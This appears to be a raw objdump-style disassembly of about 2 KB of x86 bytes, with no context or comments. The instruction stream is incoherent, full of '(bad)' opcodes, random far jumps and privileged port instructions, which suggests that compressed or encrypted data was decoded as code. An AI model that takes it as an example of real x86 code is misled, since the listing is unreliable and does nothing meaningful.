  4210ac:	mov    cl,0x77
  4210ae:	inc    edi
  4210af:	(bad)  
  4210b0:	mov    al,0xd4
  4210b2:	fwait
  4210b3:	push   esp
  4210b4:	adc    al,0x6d
  4210b6:	cmc    
  4210b7:	mov    ch,0xa7
  4210b9:	das    
  4210ba:	aaa    
  4210bb:	lds    eax,FWORD PTR [eax]
  4210bd:	or     al,0x59
  4210bf:	aaa    
  4210c0:	fild   QWORD PTR [ebx+0x3f]
  4210c3:	dec    edi
  4210c4:	cmp    BYTE PTR [edx-0x464fe5f],dh
  4210ca:	fwait
  4210cb:	xchg   esi,eax
  4210cc:	lahf   
  4210cd:	loop   0x421091
  4210cf:	or     ah,ah
  4210d1:	pop    eax
  4210d2:	and    eax,0x26ca159d
  4210d7:	jmp    0x9981:0xb0f641d6
  4210de:	jp     0x4210af
  4210e0:	out    dx,eax
  4210e1:	fisttp WORD PTR [edx]
  4210e3:	lea    esp,ds:[ecx-0x6e93449a]
  4210ea:	sub    al,0xff
  4210ec:	mov    ds,esp
  4210ee:	jb     0x4210ef
  4210f0:	mov    esi,0xfd2f63c5
  4210f5:	and    ecx,DWORD PTR [ebp+eiz*4+0x19100cfe]
  4210fc:	dec    ebp
  4210fd:	and    eax,0xd65f6714
  421102:	xor    ebx,DWORD PTR [ebx]
  421104:	inc    edx
  421105:	and    edx,DWORD PTR [esi]
  421107:	out    0xf7,al
  421109:	out    0x38,eax
  42110b:	popa   
  42110c:	xchg   ebp,eax
  42110d:	and    al,0x84
  42110f:	arpl   WORD PTR [eax+0x4c86ee71],bx
  421115:	aam    0xe6
  421117:	aad    0x1c
  421119:	mov    bh,0xfd
  42111b:	inc    eax
  42111c:	adc    al,0x79
  42111e:	xor    ebx,ecx
  421120:	ret    
  421121:	cs ss jnp 0x4210b7
  421125:	xchg   ebp,eax
  421126:	jbe    0x42117d
  421128:	fmul   DWORD PTR [eax-0x13]
  42112b:	xchg   esi,eax
  42112c:	or     esi,DWORD PTR ds:0xd223908f
  421132:	xor    esi,0xffffffa5
  421135:	mov    eax,ds:0x1cc97a78
  42113a:	gs ds jg 0x421101
  42113e:	jp     0x421106
  421140:	shr    DWORD PTR [ecx+ebp*2],1
  421143:	inc    ecx
  421144:	imul   ecx,DWORD PTR [edx+esi*8-0x6],0xffffffdf
  421149:	or     DWORD PTR [ebx-0x40afc7a7],ebx
  42114f:	in     eax,0xa4
  421151:	add    ebp,DWORD PTR [edi-0x33001b91]
  421157:	in     eax,0x61
  421159:	adc    bl,BYTE PTR [ecx+0x3c757223]
  42115f:	or     dh,BYTE PTR [edi]
  421161:	xchg   esi,eax
  421162:	pop    ebx
  421163:	jp     0x4211c9
  421165:	mov    dh,0xca
  421167:	dec    ebp
  421168:	adc    ebp,DWORD PTR [edx+ecx*1]
  42116b:	lods   eax,DWORD PTR ds:[esi]
  42116c:	inc    edi
  42116d:	push   ecx
  42116e:	ret    0xb431
  421171:	fsubr  st(1),st
  421173:	jmp    0x335f:0xf62363f8
  42117a:	push   es
  42117b:	fisubr DWORD PTR [edx-0x1b1dc6a4]
  421181:	sub    al,0xa2
  421183:	add    BYTE PTR [ecx],cl
  421185:	fwait
  421186:	stos   DWORD PTR es:[edi],eax
  421187:	jnp    0x4211fd
  421189:	cmp    bh,BYTE PTR [esi+ebx*2-0x12b9ba65]
  421190:	mov    eax,ds:0x8cab0ace
  421195:	adc    BYTE PTR [ebp+0x11],0xcf
  421199:	mov    dh,0x52
  42119b:	mov    dh,0x16
  42119d:	fidiv  DWORD PTR [ebx]
  42119f:	xchg   ebx,eax
  4211a0:	loopne 0x4211d3
  4211a2:	xchg   BYTE PTR [edx],ah
  4211a4:	sbb    esp,DWORD PTR [ecx+0x22]
  4211a7:	sub    eax,0x66f30aea
  4211ac:	or     edi,ebx
  4211ae:	test   ch,cl
  4211b0:	push   es
  4211b1:	js     0x4211e6
  4211b3:	mov    ch,al
  4211b5:	xchg   esp,eax
  4211b6:	or     DWORD PTR [ebx-0x40],edx
  4211b9:	adc    bh,BYTE PTR [edx+eiz*1]
  4211bc:	shl    bh,1
  4211be:	js     0x4211aa
  4211c0:	mov    dl,0xd
  4211c2:	or     al,0x71
  4211c4:	ja     0x4211f6
  4211c6:	sub    DWORD PTR [ebp+0x42dc0041],ebp
  4211cc:	mov    dl,0x8d
  4211ce:	aam    0xcb
  4211d0:	ret    
  4211d1:	lods   eax,DWORD PTR ds:[esi]
  4211d2:	gs aam 0x8
  4211d5:	stc    
  4211d6:	mov    edi,0x6ea09dfc
  4211db:	pop    edx
  4211dc:	xchg   DWORD PTR [ebp-0x76],esp
  4211df:	in     al,dx
  4211e0:	imul   edx,DWORD PTR [esi+0x50],0x8036a5e4
  4211e7:	cmc    
  4211e8:	mov    eax,ds:0x553e5110
  4211ed:	or     DWORD PTR [edi+0x8],esp
  4211f0:	sub    BYTE PTR [edi],ah
  4211f2:	mov    al,0x95
  4211f4:	inc    edx
  4211f5:	push   ebp
  4211f6:	mov    edi,0x650838e4
  4211fb:	mov    ah,dl
  4211fd:	retf   0x9b3
  421200:	(bad)  
  421201:	push   ebx
  421202:	scas   eax,DWORD PTR es:[edi]
  421203:	mov    ds:0xa48ad4f6,eax
  421208:	sahf   
  421209:	mov    eax,0xc6f823bf
  42120e:	dec    dh
  421210:	mov    DWORD PTR [ebx+0x3b],ebp
  421213:	out    0xb0,eax
  421215:	arpl   bp,bx
  421217:	aam    0x2d
  421219:	std    
  42121a:	sub    eax,0x370596c8
  42121f:	mov    dl,BYTE PTR [edi+0x146cec43]
  421225:	mov    al,ds:0xede88e2
  42122a:	nop
  42122b:	or     al,0x54
  42122d:	push   ds
  42122e:	xchg   esi,eax
  42122f:	repnz mov ebp,0xac6da854
  421235:	stc    
  421236:	ins    DWORD PTR es:[edi],dx
  421237:	inc    eax
  421238:	addr16 popf 
  42123a:	imul   esi,DWORD PTR [edx],0xf03e1152
  421240:	icebp  
  421241:	pushf  
  421242:	mov    al,0x9c
  421244:	push   eax
  421245:	add    ebx,ebp
  421247:	in     al,0x19
  421249:	xchg   edi,eax
  42124a:	adc    ecx,esp
  42124c:	mov    ds:0x8a518d5d,al
  421251:	mov    al,0x59
  421253:	cmp    dh,BYTE PTR [ebx]
  421255:	inc    esi
  421256:	sahf   
  421257:	cs cwde 
  421259:	add    ch,BYTE PTR [edi-0x413298b4]
  42125f:	(bad)  
  421260:	sbb    eax,0x5a597d32
  421265:	stos   BYTE PTR es:[edi],al
  421266:	push   esp
  421267:	test   eax,0x71e8498c
  42126c:	ins    BYTE PTR es:[edi],dx
  42126d:	dec    ecx
  42126e:	xchg   ebp,eax
  42126f:	in     eax,dx
  421270:	xchg   BYTE PTR [ecx-0xbd63a52],bl
  421276:	cs mov ebx,0x3750b5f6
  42127c:	fadd   st,st(7)
  42127e:	iret   
  42127f:	sbb    BYTE PTR [edx-0x5f],al
  421282:	nop
  421283:	push   ebp
  421284:	jo     0x421238
  421286:	ss dec ebp
  421288:	call   0xf73a518c
  42128d:	jbe    0x4212cf
  42128f:	xchg   esi,eax
  421290:	xor    al,0xbf
  421292:	js     0x4212d3
  421294:	and    al,0xdb
  421296:	push   esp
  421297:	stc    
  421298:	cmp    eax,0xc087e925
  42129d:	fnsave [ebx+ebp*2]
  4212a0:	inc    esi
  4212a1:	jmp    0xfde2c310
  4212a6:	popa   
  4212a7:	icebp  
  4212a8:	fsub   QWORD PTR ss:[edi]
  4212ab:	scas   eax,DWORD PTR es:[edi]
  4212ac:	into   
  4212ad:	adc    ebx,DWORD PTR [esi-0x3]
  4212b0:	mov    eax,0x1d71e070
  4212b5:	pop    ecx
  4212b6:	shl    ch,0xa1
  4212b9:	fld    QWORD PTR [ecx-0x79]
  4212bc:	sar    cl,1
  4212be:	adc    eax,DWORD PTR [esi]
  4212c0:	cmp    edx,DWORD PTR [eax-0x62]
  4212c3:	stos   DWORD PTR es:[edi],eax
  4212c4:	das    
  4212c5:	ret    0xcc31
  4212c8:	xchg   ebp,eax
  4212c9:	mov    ecx,0x98c63ca6
  4212ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212cf:	enter  0xb6d5,0xb
  4212d3:	mov    bl,0xc5
  4212d5:	cld    
  4212d6:	adc    dh,al
  4212d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212d9:	mov    dl,BYTE PTR [ebx+ebx*4]
  4212dc:	loopne 0x4212c7
  4212de:	dec    ebp
  4212df:	dec    esi
  4212e0:	mov    edi,0x25e7f2b0
  4212e5:	les    edx,FWORD PTR [esi-0x7d040ab3]
  4212eb:	test   al,0x72
  4212ed:	xchg   esi,eax
  4212ee:	mov    ebp,edi
  4212f0:	out    dx,eax
  4212f1:	imul   BYTE PTR [eax]
  4212f3:	retf   0x8030
  4212f6:	and    BYTE PTR [edi-0x9030a86],cl
  4212fc:	not    cl
  4212fe:	and    cl,al
  421300:	push   ss
  421301:	jnp    0x4212ee
  421303:	xor    BYTE PTR [ecx],0xd8
  421306:	push   esi
  421307:	shl    ebp,1
  421309:	mov    dh,BYTE PTR [ebp+0x7a]
  42130c:	imul   esi,ebp,0xfffffffe
  42130f:	aaa    
  421310:	loop   0x421358
  421312:	(bad)  
  421313:	stos   BYTE PTR es:[edi],al
  421314:	jmp    0xba6d:0x21cfcbe7
  42131b:	test   esi,ebp
  42131d:	pop    ecx
  42131e:	enter  0x8092,0x7f
  421322:	mov    ah,0x3b
  421324:	push   DWORD PTR [esi+0x10f656c0]
  42132a:	mov    ds:0x7033a7a6,al
  42132f:	dec    esi
  421330:	(bad)  
  421331:	ins    DWORD PTR es:[edi],dx
  421332:	repz dec edi
  421334:	and    eax,0xd8c3e73f
  421339:	je     0x421391
  42133b:	daa    
  42133c:	inc    ebx
  42133d:	fadd   QWORD PTR [eax+0x2d03942d]
  421343:	loop   0x4212e2
  421345:	mov    eax,0xac06eebf
  42134a:	mov    ds:0x34bc8b5d,eax
  42134f:	rcl    dl,1
  421351:	dec    ebp
  421352:	xor    eax,0x6a08cbe2
  421357:	repz jmp 0x421312
  42135a:	js     0x4212f7
  42135c:	into   
  42135d:	and    bl,ah
  42135f:	pop    edi
  421360:	mov    WORD PTR [esi+esi*4+0x23],?
  421364:	fsubr  QWORD PTR [edx]
  421366:	xor    al,0xb5
  421368:	cmp    al,0x57
  42136a:	inc    eax
  42136b:	cmp    BYTE PTR [esi+0x2ced3bef],0xb
  421372:	inc    eax
  421373:	jnp    0x42130c
  421375:	and    bl,dl
  421377:	and    eax,0x4bcfe3d0
  42137c:	aam    0xbc
  42137e:	repz jno 0x421390
  421381:	jle    0x421375
  421383:	cmp    al,0x63
  421385:	push   ds
  421386:	enter  0xba36,0x86
  42138a:	iret   
  42138b:	sub    cl,BYTE PTR [ebp+0x5c19dd7]
  421391:	add    al,0x3b
  421393:	daa    
  421394:	jge    0x421350
  421396:	pop    eax
  421397:	addr16 mov ah,0xa9
  42139a:	cli    
  42139b:	sti    
  42139c:	xchg   edx,eax
  42139d:	add    esp,DWORD PTR [edi]
  42139f:	jno    0x421347
  4213a1:	mov    al,ds:0x6e743b21
  4213a6:	mov    cl,0x60
  4213a8:	fiadd  DWORD PTR [si+0x6d58]
  4213ad:	sbb    edx,ecx
  4213af:	mov    DWORD PTR [eax+0x20878fb5],edx
  4213b5:	mov    cs,WORD PTR [ecx+eiz*8-0x70d2fe43]
  4213bc:	push   ecx
  4213bd:	sbb    esi,ecx
  4213bf:	clc    
  4213c0:	ret    
  4213c1:	add    al,0xc
  4213c3:	lahf   
  4213c4:	outs   dx,DWORD PTR ds:[esi]
  4213c5:	xlat   BYTE PTR ds:[ebx]
  4213c6:	push   cs
  4213c7:	arpl   WORD PTR ds:0x10db67a8,si
  4213cd:	fs sahf 
  4213cf:	shr    edx,1
  4213d1:	and    ecx,esi
  4213d3:	lea    ebx,[edx+0x56b91df5]
  4213d9:	cs (bad) 
  4213db:	xor    eax,0x9f68238f
  4213e0:	rcl    BYTE PTR [ecx+0x3],1
  4213e3:	or     eax,0xf46b130
  4213e8:	mov    ebp,0xdf5935b4
  4213ed:	sub    DWORD PTR ds:0x824976c9,ebx
  4213f3:	jns    0x421434
  4213f5:	cmp    eax,0x730423cc
  4213fa:	pop    ebx
  4213fb:	xor    edi,DWORD PTR [ebp-0x45]
  4213fe:	sub    dl,BYTE PTR [ebp-0x21]
  421401:	mov    esp,0xc046505e
  421406:	add    WORD PTR [eax+ecx*1-0x72fd5af2],ax
  42140e:	outs   dx,BYTE PTR ds:[esi]
  42140f:	das    
  421410:	push   ebp
  421411:	push   edi
  421412:	jne    0x4213ea
  421414:	dec    ebp
  421415:	sbb    al,0x7d
  421417:	ret    0x5617
  42141a:	push   0xffffffdc
  42141c:	ficom  WORD PTR [edi+0x1c]
  42141f:	cvtss2si edx,DWORD PTR [esi-0x4d]
  421424:	lds    ebx,FWORD PTR [edx+edi*2-0x36]
  421428:	dec    BYTE PTR [esi+0x22]
  42142b:	jl     0x4213f5
  42142d:	lods   eax,DWORD PTR ds:[esi]
  42142e:	imul   edi,DWORD PTR [ebx],0x1
  421431:	sbb    eax,0x3b0f217e
  421436:	std    
  421437:	ins    DWORD PTR es:[edi],dx
  421438:	push   ebx
  421439:	xchg   esp,eax
  42143a:	xchg   esp,eax
  42143b:	nop
  42143c:	repz mov edi,0x41c7a54
  421442:	fbld   TBYTE PTR [ebx-0x61]
  421445:	or     esi,DWORD PTR [edx+0xd]
  421448:	ds push edi
  42144a:	dec    ecx
  42144b:	repz in eax,0xbb
  42144e:	fs mov ch,0xee
  421451:	xor    ch,al
  421453:	adc    DWORD PTR [esi+0x401a6797],0xffffffc0
  42145a:	test   al,0xf7
  42145c:	pop    ebx
  42145d:	sbb    eax,0xdb6289e0
  421462:	adc    DWORD PTR [ebx-0x29],0xffffff92
  421466:	in     al,0x2f
  421468:	and    al,0x37
  42146a:	pop    esi
  42146b:	xchg   DWORD PTR [eax],edi
  42146d:	icebp  
  42146e:	out    dx,al
  42146f:	leave  
  421470:	test   DWORD PTR [ebp-0x2204e1d5],0x549d5aaa
  42147a:	and    BYTE PTR [ebx+0x18ef5d7],al
  421480:	or     eax,0x23511be8
  421485:	fisttp DWORD PTR [esi+0x4a]
  421488:	cmp    eax,0x605e4daa
  42148d:	pop    ss
  42148e:	fwait
  42148f:	les    edx,FWORD PTR [edi-0x69]
  421492:	add    al,0x31
  421494:	int    0x2a
  421496:	and    BYTE PTR [esi-0x1a],dh
  421499:	out    0xa8,eax
  42149b:	xor    ebp,DWORD PTR [esi+0x1c]
  42149e:	lods   eax,DWORD PTR ds:[esi]
  42149f:	cli    
  4214a0:	and    al,ch
  4214a2:	jmp    0xf088:0xef97c6c8
  4214a9:	(bad)  
  4214ab:	sbb    al,0xf2
  4214ad:	xchg   BYTE PTR [eax-0x3d],dl
  4214b0:	jae    0x4214ec
  4214b2:	loop   0x4214c0
  4214b4:	es sti 
  4214b6:	sbb    al,0xb
  4214b8:	push   0x199d571e
  4214bd:	pusha  
  4214be:	cmp    dh,dl
  4214c0:	aad    0x87
  4214c2:	mov    edi,0x49a8f362
  4214c7:	jmp    0xcfc9:0xe534ed1b
  4214ce:	sub    al,0x2e
  4214d0:	pop    edx
  4214d1:	(bad)  
  4214d2:	scas   eax,DWORD PTR es:[edi]
  4214d3:	(bad)  
  4214d4:	imul   esi,DWORD PTR [edx+ecx*2-0x791303ae],0xffffffde
  4214dc:	and    al,0x23
  4214de:	icebp  
  4214df:	dec    esp
  4214e0:	push   0x87a3b9a1
  4214e5:	pop    ds
  4214e6:	mov    ch,0x6e
  4214e8:	mov    ds:0xf7609e07,al
  4214ed:	jmp    0xdfe0:0x20642a8e
  4214f4:	outs   dx,DWORD PTR fs:[esi]
  4214f6:	dec    edi
  4214f7:	rcl    DWORD PTR [eax+ebp*2+0x1831280e],0xf
  4214ff:	mov    dh,0xf1
  421501:	adc    eax,0x3ff087e7
  421506:	bound  edi,QWORD PTR [esp+edx*1+0x42]
  42150a:	mov    eax,ds:0x6e1a2921
  42150f:	pop    es
  421510:	jmp    0x4214d3
  421512:	push   ss
  421513:	and    al,0xc0
  421515:	sar    DWORD PTR fs:[esi+esi*2+0xa],1
  42151a:	mov    ebp,0x94141b65
  42151f:	and    eax,0xd201dd1f
  421524:	popf   
  421525:	sub    BYTE PTR [ebx-0x2bb25508],al
  42152b:	ret    0xbec4
  42152e:	cmp    DWORD PTR [ebx+0x4054373e],0xd2fedf70
  421538:	sbb    dh,dl
  42153a:	and    DWORD PTR [edx+eax*4],0x86133207
  421541:	fs loope 0x4214ce
  421544:	scas   al,BYTE PTR es:[edi]
  421545:	pop    eax
  421546:	mov    WORD PTR [eax+0x3c676b38],es
  42154c:	xor    cl,dh
  42154e:	ds jmp 0x421571
  421551:	out    dx,eax
  421552:	scas   eax,DWORD PTR es:[edi]
  421553:	mov    DWORD PTR [ebx],0x6d9c5cdb
  421559:	pop    edi
  42155a:	fdiv   st,st(0)
  42155c:	pop    ds
  42155d:	les    ebx,FWORD PTR [ebx]
  42155f:	enter  0x3958,0x19
  421563:	jp     0x421501
  421565:	fidiv  DWORD PTR [eax]
  421567:	dec    eax
  421568:	int    0x2d
  42156a:	inc    edi
  42156b:	inc    esi
  42156c:	das    
  42156d:	in     al,0xbd
  42156f:	jecxz  0x4215a1
  421571:	xchg   esp,eax
  421572:	xchg   ecx,eax
  421573:	push   edx
  421574:	xor    ecx,DWORD PTR [eax+0x495e97dd]
  42157a:	loop   0x421544
  42157c:	aaa    
  42157d:	dec    esp
  42157e:	lods   eax,DWORD PTR ds:[esi]
  42157f:	mov    eax,ds:0xbd73f38c
  421584:	sub    DWORD PTR [ebx],eax
  421586:	stos   DWORD PTR es:[edi],eax
  421587:	fld    DWORD PTR [ebp+0x6f]
  42158a:	(bad)  
  42158b:	mov    al,ds:0xb60443ad
  421590:	mov    ebx,0xb14df38e
  421595:	adc    BYTE PTR [edi+0x3366554],dh
  42159b:	lea    ebx,[eax]
  42159d:	xor    BYTE PTR [edi-0x7b85bcae],dl
  4215a3:	inc    edi
  4215a4:	pop    ebx
  4215a5:	inc    esi
  4215a6:	cmc    
  4215a7:	push   edx
  4215a8:	mov    bh,0x2a
  4215aa:	imul   edx,DWORD PTR [ebp+0x73],0x36
  4215ae:	in     eax,0xc8
  4215b0:	add    al,0x2b
  4215b2:	(bad)  
  4215b3:	xlat   BYTE PTR ds:[ebx]
  4215b4:	push   ecx
  4215b5:	stos   BYTE PTR es:[edi],al
  4215b6:	call   0x97171a85
  4215bb:	xor    al,0xe5
  4215bd:	lea    edx,[edi+0x50]
  4215c0:	xchg   ecx,eax
  4215c1:	stc    
  4215c2:	or     al,0x69
  4215c4:	aas    
  4215c5:	call   ebp
  4215c7:	leave  
  4215c8:	dec    eax
  4215c9:	inc    esp
  4215ca:	ins    BYTE PTR es:[edi],dx
  4215cb:	pusha  
  4215cc:	loop   0x42159a
  4215ce:	stos   BYTE PTR es:[edi],al
  4215cf:	xchg   ecx,eax
  4215d0:	cmp    eax,0x78a91408
  4215d5:	(bad)  
  4215d6:	sbb    ch,al
  4215d8:	mov    ebp,0xc3e2ae6a
  4215dd:	iret   
  4215de:	das    
  4215df:	stc    
  4215e0:	mov    ebx,0xc65eaf11
  4215e5:	and    al,0xd8
  4215e7:	adc    eax,0x6d3808ab
  4215ec:	hlt    
  4215ed:	leave  
  4215ee:	jne    0x42163f
  4215f0:	lods   al,BYTE PTR ds:[esi]
  4215f1:	ins    DWORD PTR es:[edi],dx
  4215f2:	xchg   esp,ebx
  4215f4:	sbb    dh,BYTE PTR [ebx]
  4215f6:	retf   0x7a56
  4215f9:	xchg   esi,eax
  4215fa:	call   0x6a356e95
  4215ff:	pop    eax
  421600:	stos   DWORD PTR es:[edi],eax
  421601:	inc    eax
  421602:	ins    BYTE PTR es:[edi],dx
  421603:	sub    bx,WORD PTR [ebx-0x8195629]
  42160a:	mov    edi,0xe6865e1b
  42160f:	mov    cs:0x8964a2c7,eax
  421615:	loope  0x4215b1
  421617:	(bad)  [ecx-0x4d]
  42161a:	xchg   esi,eax
  42161b:	sbb    BYTE PTR [eax+0x63fd8646],bh
  421621:	es jl  0x4215e2
  421624:	mov    edi,0xe18a310e
  421629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42162a:	jnp    0x42160e
  42162c:	aaa    
  42162d:	push   esi
  42162e:	pop    es
  42162f:	push   edx
  421630:	rcl    esi,0x58
  421633:	pop    edi
  421634:	mov    ebp,0xd76b1473
  421639:	ds (bad) 
  42163b:	stos   DWORD PTR es:[edi],eax
  42163c:	xor    al,0x97
  42163e:	pop    ecx
  42163f:	sub    BYTE PTR [ecx-0xd454247],0xb6
  421646:	into   
  421647:	and    DWORD PTR [esi],0xffffffb1
  42164a:	pop    ds
  42164b:	mov    DWORD PTR [edi-0x2b0947d8],0xb13934e4
  421655:	mov    ebx,0xa9e033b4
  42165a:	div    DWORD PTR [ebp-0x77916848]
  421660:	fisttp DWORD PTR [ebx+esi*4-0x3514ccaf]
  421667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421668:	dec    ecx
  421669:	test   ah,bl
  42166b:	xor    BYTE PTR [ebp-0x3b7e50db],dh
  421671:	inc    ebp
  421672:	inc    ebx
  421673:	pop    ds
  421674:	(bad)  
  421675:	aad    0x89
  421677:	or     al,0x6c
  421679:	cmp    eax,0x2da34be6
  42167e:	fdiv   st,st(6)
  421680:	mov    ebx,0xa76d2917
  421685:	(bad)  
  421686:	jmp    0x4b35:0x18bf6236
  42168d:	stc    
  42168e:	xor    edi,DWORD PTR [ecx-0x3e]
  421691:	scas   al,BYTE PTR es:[edi]
  421692:	cmp    BYTE PTR [eax+eax*1],0x2c
  421696:	xchg   ebp,eax
  421697:	nop
  421698:	sub    ebx,DWORD PTR fs:[eax+0x56]
  42169c:	pop    eax
  42169d:	and    BYTE PTR [eax+0x78],0xd1
  4216a1:	jnp    0x42170c
  4216a3:	test   ecx,0x4d00ac7d
  4216a9:	iret   
  4216aa:	cmp    al,0x25
  4216ac:	pop    ecx
  4216ad:	test   al,0x87
  4216af:	call   0x31cc59e5
  4216b4:	call   0xfffc247b
  4216b9:	scas   al,BYTE PTR es:[edi]
  4216ba:	add    al,0x48
  4216bc:	xor    DWORD PTR [ebx-0x62],0xffffff93
  4216c0:	or     eax,0x54381e6f
  4216c5:	or     BYTE PTR [edx],bl
  4216c7:	cmp    DWORD PTR [edx],ecx
  4216c9:	fild   DWORD PTR [bp+si]
  4216cc:	dec    ebp
  4216cd:	mov    edx,0x9c9675c1
  4216d2:	and    al,0x83
  4216d4:	xor    BYTE PTR [edi-0x62387763],ah
  4216da:	jbe    0x421712
  4216dc:	or     eax,0x51c456b
  4216e1:	sbb    DWORD PTR [edx-0x575f39d8],esp
  4216e7:	sbb    edx,esi
  4216e9:	mov    dh,0xcc
  4216eb:	scas   al,BYTE PTR es:[edi]
  4216ec:	sub    ebx,edx
  4216ee:	imul   DWORD PTR [ebp-0x64a51fdc]
  4216f4:	xchg   esi,eax
  4216f5:	scas   al,BYTE PTR es:[edi]
  4216f6:	fisttp QWORD PTR [ecx+0x6ddd1e67]
  4216fc:	sbb    DWORD PTR [ebx-0x7442cd7c],esp
  421702:	scas   al,BYTE PTR es:[edi]
  421703:	adc    esi,DWORD PTR [esp+esi*8+0xf]
  421707:	nop
  421708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421709:	mov    cl,0xeb
  42170b:	cwde   
  42170c:	push   esp
  42170d:	in     al,dx
  42170e:	arpl   sp,si
  421710:	aaa    
  421711:	cdq    
  421712:	fmul   st,st(5)
  421714:	lock fnstsw WORD PTR [ebx+0x15581312]
  42171b:	xchg   edi,eax
  42171c:	test   eax,0x2ada74b
  421721:	push   ds
  421722:	dec    esi
  421723:	shl    DWORD PTR [edx+eiz*4-0x12],1
  421727:	pop    eax
  421728:	sub    eax,0xf3b45b7e
  42172d:	mov    dh,BYTE PTR [eax]
  42172f:	push   es
  421730:	mov    esp,edx
  421732:	jnp    0x42179f
  421734:	xchg   ecx,eax
  421735:	test   BYTE PTR [ebx+0x54],cl
  421738:	pop    es
  421739:	fsubr  QWORD PTR [edx-0x3cd7a03e]
  42173f:	or     al,BYTE PTR [ebx+ebp*1]
  421742:	fst    DWORD PTR [edi+0x44fbe98]
  421748:	in     al,dx
  421749:	loop   0x4217bd
  42174b:	dec    esi
  42174c:	shl    ebx,cl
  42174e:	xchg   edi,eax
  42174f:	enter  0x87b6,0x37
  421753:	xchg   BYTE PTR [edx],bh
  421755:	shl    DWORD PTR [esi+edi*2-0x5d50bab],cl
  42175c:	aad    0x73
  42175e:	xchg   ecx,eax
  42175f:	repz sub dh,BYTE PTR [edi]
  421762:	je     0x42174d
  421764:	movntq QWORD PTR [eax],mm4
  421767:	xor    al,0xa4
  421769:	push   ebp
  42176a:	add    esp,ecx
  42176c:	imul   edx,DWORD PTR [ecx],0x85d64f41
  421772:	dec    edx
  421773:	in     eax,dx
  421774:	cmp    BYTE PTR fs:[ecx+esi*1-0x1c],dh
  421779:	push   es
  42177a:	or     esp,DWORD PTR [ecx-0x5d]
  42177d:	and    BYTE PTR [ebp+0x7b83e879],cl
  421783:	push   es
  421784:	stc    
  421785:	or     al,0x12
  421787:	fst    QWORD PTR ds:0x356ccd6d
  42178d:	mov    ebp,0x8a368181
  421792:	mov    BYTE PTR [ebp-0x1b2ed091],cl
  421798:	xlat   BYTE PTR ds:[ebx]
  421799:	ret    
  42179a:	jge    0x421817
  42179c:	xlat   BYTE PTR ds:[ebx]
  42179d:	push   esp
  42179e:	aas    
  42179f:	ja     0x4217c6
  4217a1:	ret    
  4217a2:	jl     0x421755
  4217a4:	gs mov edi,0x27d9e810
  4217aa:	mov    ch,0xd2
  4217ac:	in     eax,dx
  4217ad:	mov    eax,ds:0xc942994
  4217b2:	fsub   st(2),st
  4217b4:	stc    
  4217b5:	adc    DWORD PTR [edx-0x2f],0xffffffb5
  4217b9:	lds    esi,FWORD PTR [edx+edx*1+0xbadfb25]
  4217c0:	pushf  
  4217c1:	int3   
  4217c2:	and    al,0x8e
  4217c4:	(bad)
  4217c7:	mov    bl,0x5b
  4217c9:	test   cl,0x3
  4217cc:	(bad)  
  4217ce:	jecxz  0x4217f9
  4217d0:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217d2:	mov    ebp,DWORD PTR [edx]
  4217d4:	mov    edx,0xabefd898
  4217d9:	add    eax,0x2ef56f99
  4217de:	sbb    eax,0xfb3ac360
  4217e3:	clc    
  4217e4:	sbb    eax,0xadf2bd5d
  4217e9:	aaa    
  4217ea:	fstp   TBYTE PTR ds:[esp+edx*8+0x42]
  4217ef:	inc    edx
  4217f0:	or     eax,0xbb1c9cd9
  4217f5:	aas    
  4217f6:	call   0x85eb0cf6
  4217fb:	mov    ds:0x90d3f3fb,eax
  421800:	inc    edx
  421801:	jp     0x421786
  421803:	js     0x4217ac
  421805:	push   ecx
  421806:	cli    
  421807:	mov    eax,0xd7049833
  42180c:	sub    al,al
  42180e:	inc    esi
  42180f:	cmp    dh,BYTE PTR [esi]
  421811:	xor    eax,0xc4f830c3
  421816:	mov    bh,0x8e
  421818:	mov    esp,DWORD PTR [ecx+0x39]
  42181b:	lock dec esp
  42181d:	stos   DWORD PTR es:[edi],eax
  42181e:	and    al,0xf7
  421820:	es loopne 0x4217e5
  421823:	fcmove st,st(0)
  421825:	fidiv  WORD PTR [eax+0x220604ce]
  42182b:	in     al,dx
  42182c:	pop    edx
  42182d:	call   0x224f:0x978d124f
  421834:	pop    esi
  421835:	mov    ch,0xa2
  421837:	dec    ebx
  421838:	cmp    esp,edi
  42183a:	repnz test eax,0x217de5a4
  421840:	mov    edi,DWORD PTR [ecx+0x21]
  421843:	test   DWORD PTR [edx+ebp*1],0xdb1c432b
  42184a:	mov    ecx,DWORD PTR [eax]
  42184c:	fst    DWORD PTR ds:0x31d5d6c3
  421852:	in     al,dx
  421853:	jo     0x421870
  421855:	nop
  421856:	(bad)  
  421857:	in     al,0xb5
  421859:	push   cs
  42185a:	data16 test BYTE PTR [esi-0x4b29e24e],0x6a
  421862:	aad    0x6d
  421864:	fnstcw WORD PTR [ecx-0x777f1b42]
  42186a:	sbb    BYTE PTR [ecx],dh
  42186c:	in     al,0xeb
  42186e:	sar    BYTE PTR [ebx],cl
  421870:	cmp    BYTE PTR [eax],ah
  421872:	dec    ecx
  421873:	or     eax,0xd24a8c78
  421878:	push   ecx
  421879:	out    dx,al
  42187a:	mov    esi,0x5c0d520d
  42187f:	cdq    
  421880:	scas   eax,DWORD PTR es:[edi]
  421881:	xchg   ebx,eax
  421882:	mov    edi,0xf841611b
  421887:	imul   ecx,DWORD PTR [edi],0x279006c9
  42188d:	cmp    BYTE PTR [esi+0x425328ce],dl
  421893:	inc    esp
  421894:	popf   
  421895:	cs jge 0x42185f
  421898:	mov    esp,0x7d7f2b2c
  42189d:	je     0x42182f
  42189f:	inc    ebp
  4218a0:	lds    ecx,FWORD PTR [edi]
  4218a2:	push   ebx
  4218a3:	(bad)  
  4218a4:	dec    esi
  4218a5:	push   edx
  4218a6:	je     0x421873
  4218a8:	and    DWORD PTR [edi-0x4f22bcac],esi
  4218ae:	inc    ebx
  4218af:	push   esp
  4218b0:	sahf   
  4218b1:	jae    0x42184c
  4218b3:	ret    0x2c1a
  4218b6:	or     al,0x95
  4218b9:	or     ah,al
  4218bb:	loop   0x421856
  4218bd:	in     eax,0x6
  4218bf:	lock call 0x4dae:0x7f68772f
  4218c7:	mov    eax,ds:0x35591244
  4218cc:	adc    ah,BYTE PTR [eax]
  4218ce:	mov    dh,0xc5
  4218d0:	gs inc esp
